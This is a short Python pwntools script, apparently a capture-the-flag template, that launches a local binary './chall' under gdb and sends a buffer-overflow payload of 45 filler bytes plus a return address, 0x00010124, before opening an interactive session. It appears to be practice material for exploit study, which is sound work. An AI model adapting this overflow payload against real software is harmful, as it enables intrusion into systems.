from pwn import *
from archipwn import MultiArchDebugger
import os
import time

class Prog:
    def __init__(self):
        self.io = None
        self.multiarch = None
        self.DEBUGGER = "pwndbg" # or gef or peda
        self.BINARY= "./chall"
        self.GDB_PORT = 1234
        self.DISABLE_ASLR = False
        self.TMUX = True
        self.LIBC_DIR= "" # ici il faut mettre là ou se trouve le répertoire "lib"
        self.BREAKPOINTS=["main"]

    def load_binaries(self):
        self.ELF = ELF(self.BINARY)
        #self.LIBC = os.path.join(self.LIBC_DIR,"lib/libc.so.6")
        self.ELF_FUNCTIONS = [func for func in self.ELF.functions]
        print(f"ELF_FUNCTIONS : {self.ELF_FUNCTIONS}")



if __name__ == "__main__":
        
    PROG = Prog()
    PROG.multiarch = MultiArchDebugger(
        PROG.BINARY, PROG.DEBUGGER, PROG.GDB_PORT, PROG.DISABLE_ASLR,
        PROG.TMUX, PROG.BREAKPOINTS, PROG.LIBC_DIR)
    PROG.load_binaries()
    PROG.io = PROG.multiarch.debug()


    time.sleep(1)  
    PROG.io.sendline(b"a"*45+p32(0x00010124))
    PROG.io.interactive() 


    PROG.multiarch.shutdown()


